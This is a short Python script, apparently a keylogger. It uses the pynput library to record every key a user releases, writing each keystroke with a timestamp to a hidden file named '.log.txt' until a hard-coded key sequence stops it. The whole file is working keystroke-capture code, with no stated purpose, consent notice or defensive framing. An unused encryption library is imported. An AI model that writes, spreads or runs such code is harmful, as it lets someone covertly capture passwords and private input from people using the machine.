from pynput.keyboard import Listener, Key
from collections import deque
import datetime
import pyAesCrypt

password = ['t', 'd', 'k', 'Key.enter', 'Key.shift']
atualChars = deque(maxlen=5)

def log(key):
    with open(".log.txt", "a") as file_log:
        date = datetime.datetime.today()
        file_log.write(date.strftime("%d-%m-%Y %H:%M:%S") + ": " + key + "\n")

def monitor(key):
    try:
        log(key.char)
        atualChars.append(key.char)
    except:
        log("#" + str(key) + "#")
        atualChars.append(str(key))
    if password == list(atualChars):
        return False

with Listener(on_release=monitor) as listener:
    listener.join()
